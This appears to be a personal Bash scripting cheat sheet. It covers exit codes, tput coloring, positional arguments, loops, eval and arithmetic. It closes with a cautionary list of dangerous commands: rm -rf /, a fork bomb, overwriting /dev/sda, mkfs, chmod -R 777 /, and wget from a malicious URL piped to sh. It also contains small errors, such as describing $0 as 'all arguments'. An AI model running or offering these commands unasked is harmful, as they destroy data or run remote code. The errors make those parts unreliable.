---
title: "Bash Programming"
date: 2022-10-21T23:33:07-03:00
Description: ""
Summary: "Exit codes and Basic structures to program scripts."
Tags: [linux, cli, scripting]
Categories: [bash]
DisableComments: false
---

# Style Guide

https://google.github.io/styleguide/shellguide.html

# Exit Codes

- 0: Success
- 1 to 255: Error

## Print last exit code of a command

```bash
echo $?
```

## Table Reference

| Code | Description                    |
| ---: | :----------------------------- |
|    1 | Catchall for general errors    |
|    2 | Misuse of shell built-ins      |
|  126 | Command invoked cannot execute |
|  127 | Command not found              |
|  128 | Invalid argument to exit       |
|  130 | Script terminated by Ctrl+C    |

# Displaying Beautifully

Example:

```bash
#!/bin/bash

bold=$(tput bold);
under=$(tput smul);
italic=$(tput sitm);
info=$(tput setaf 2);
error=$(tput setaf 160);
warn=$(tput setaf 214);
reset=$(tput sgr0);

echo "${info}INFO${reset}: This is an ${bold}info${reset} message";
echo "${error}ERROR${reset}: This is an ${underline}error${reset} message";
echo "${warn}WARN${reset}: This is an ${italic}warn${reset} message";
```

# Scripting

## Header: She Bang!

```bash
#!/bin/bash
```

```sh
#!/bin/sh
```

## Arguments

- $1: first argument
- $2: second argument...
- $0: all arguments
- $\_: last argument
- $#: holds the count of positional arguments passed to the function
- $@: expands the list to separate strings. For example: "$1", "$2", ...
- $\*: expands the list into a single string, separating parameters with a space. For example "$1 $2"...

## Code Structures

### Function

```bash
function myFunction() {
  # code
}
```

Execute:

```bash
myFunction [...args]
```

### If/Else

```bash
if COMMAND; then
  # code
else
  # code
fi
```

### For Loops

```bash
for element in LIST; do
  # code
done
```

```bash
for counter in {1..10}; do
  # code
done
```

### While Loops

```bash
while COMMAND; do
  # code
done
```

Inline pipe:

```bash
some_command | while read output; do another_command; done
```

### Examples

For loop with command:

```bash
for i in $(ls ~ | grep Do); do
  echo "${i}";
done
```

Inline while:

```bash
ls ~ | grep Do | while read output; do echo "${output}"; done
```

For loop within strings:

```bash
#!/bin/bash

P1="a b c";
P2="d e f";
P=${P1}" "${P2};
for letter in ${P}; do
  echo ${letter};
done
```

For loop with lists:

```bash
#!/bin/bash

LIST=(
  "Payment"
  "Merchant"
);
for endpoint in ${LIST[@]}; do
  echo ${endpoint};
done
```

# Hints

## Define a command in a variable and invoke it with `eval`

```bash
FILE="data.csv";
AWK="awk -f script.awk";
eval "${AWK} ${FILE}";
```

## Arithmetic Operations

```bash
#!/bin/bash
y=5;
x=10;

echo $((x+y));
echo $((x-y));
echo $((x*y));
echo $((x/y));
echo $((x%y)); # modulus
```

Bash treat numbers as integers, this might be a problem in some cases. In this case, use the basic calculator `bc`.

```bash
echo "scale=2; ${x}/${y}" | bc
```

Variations:

```bash
expr ${x} + ${y};
```

```bash
let "answer = ${x} + ${y}";
echo ${answer};
```

# Dangerous Commands

- `rm -rf /`
- `command > /dev/sda`
- `:(){:|:&};:`
- `> file (cat /dev/null > file)`
- `^foo^bar`
- `mv directory /dev/null`
- `wget http://malicious-source-url -O- | sh`
- `crontab -r`
- `history | sh`
- `dd if=/dev/random of=dev/sda`
- `mkfs.ext3 /dev/sda`
- `gunzip untrusted.gz`
- Remove python: `sudo apt purge python2.x-minimal`
- `chmod -R 777 /`